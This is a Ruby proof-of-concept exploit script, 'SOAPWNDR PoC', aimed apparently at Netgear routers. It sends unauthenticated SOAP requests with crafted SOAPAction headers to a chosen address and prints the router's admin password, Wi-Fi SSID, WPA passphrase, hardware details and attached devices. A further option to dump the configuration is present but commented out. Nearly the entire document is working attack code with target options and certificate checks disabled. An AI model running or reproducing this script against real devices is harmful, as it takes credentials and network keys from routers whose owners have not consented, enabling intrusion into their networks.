# SOAPWNDR PoC.

require 'optparse'
require 'nokogiri'
require 'restclient'

# Set defaults and parse command line arguments
options = {}

options[:addr] = "192.168.1.1"
options[:port] = 80
options[:ssl] = false

OptionParser.new do |option|

  option.on("--address [ADDRESS]", "Destination hostname or IP") do |a|
    options[:addr] = a
  end

  option.on("--port [PORT]", "Destination TCP port") do |p|
    options[:port] = p
  end

  option.on("--[no-]ssl", "Destination uses SSL") do |s|
    options[:ssl] = s
  end

  option.parse!

end

# Define which SOAPActions we will be using.
actions = [
  {
    :name => "Fetch password",
    :call => "lan_config_security_get_info",
    :soap => "LANConfigSecurity:1#GetInfo"
  },
  {
    :name => "Fetch WLAN",
    :call => "wlan_config_get_info",
    :soap => "WLANConfiguration:1#GetInfo"
  },
  {
    :name => "Fetch WPA Security Keys",
    :call => "wlan_config_get_wpa_keys",
    :soap => "WLANConfiguration:1#GetWPASecurityKeys"
  },
  {
    :name => "Fetch hardware",
    :call => "device_info_get_info",
    :soap => "DeviceInfo:1#GetInfo"
  },
  {
    :name => "Fetch hardware",
    :call => "device_info_get_attached",
    :soap => "DeviceInfo:1#GetAttachDevice"
  }
  #{
  #  :name => "Dump configuration",
  #  :call => "device_config_get_config_info",
  #  :soap => "DeviceConfig:1#GetConfigInfo"
  #}
]

def device_info_get_info(xml)
  puts "[*] Model Number: #{xml.xpath('//ModelName').text}"
  puts "[*] Serial Number: #{xml.xpath('//SerialNumber').text}"
  puts "[*] Firmware Version: #{xml.xpath('//Firmwareversion').text}"
end

def lan_config_security_get_info(xml)
  puts "[*] Admin Password: #{xml.xpath("//NewPassword").text}"
end

def wlan_config_get_info(xml)
  puts "[*] WLAN SSID: #{xml.xpath('//NewSSID').text}"
  puts "[*] WLAN Enc: #{xml.xpath('//NewBasicEncryptionModes').text}"
end

def wlan_config_get_wpa_keys(xml)
  puts "[*] WLAN WPA Key: #{xml.xpath('//NewWPAPassphrase').text} "
end

def device_config_get_config_info(xml)
  puts "[*] Base64 Config: #{xml.xpath('//NewConfigFile').text} "
end

def device_info_get_attached(xml)

  # Data is '@' delimited.
  devices = xml.xpath('//NewAttachDevice').text.split("@")
  devices.each_index do |i|

    # First element is a device count.
    if i == 0
      next
    end

    # Split by ';' which pulls out the device IP, name and MAC.
    detail = devices[i].split(";")
    puts "[*] Attached: #{detail[2]} - #{detail[1]} (#{detail[3]})"

  end

end

# Form endpoint based on protocol, no path is required.
if options[:ssl]
  endpoint = "https://#{options[:addr]}:#{options[:port]}/"
else
  endpoint = "http://#{options[:addr]}:#{options[:port]}/"
end

# Iterate over all actions and attempt to execute.
puts "[!] Attempting to extract information from #{endpoint}"

actions.each do |action|

  # Build the target URL and setup the HTTP client object.
  request = RestClient::Resource.new(
    endpoint,
    :verify_ssl => OpenSSL::SSL::VERIFY_NONE)

  # Fire the request and ensure a 200 OKAY.
  begin
    response = request.post(
      { "" => "" },
      { "SOAPAction" => "urn:NETGEAR-ROUTER:service:#{action[:soap]}"})
  rescue
    puts "[!] Failed to query remote host."
    abort
  end

  if response.code != 200
    puts "[-] '#{action[:name]}' failed with response: #{response.code}"
    next
  end

  # Parse XML document.
  xml = Nokogiri::XML(response.body())

  if xml.xpath('//ResponseCode').text == '401'
    puts "[-] '#{action[:name]}' failed with a SOAP error (401)"
    next
  end

  # Send to the processor.
  send(action[:call], xml)

end
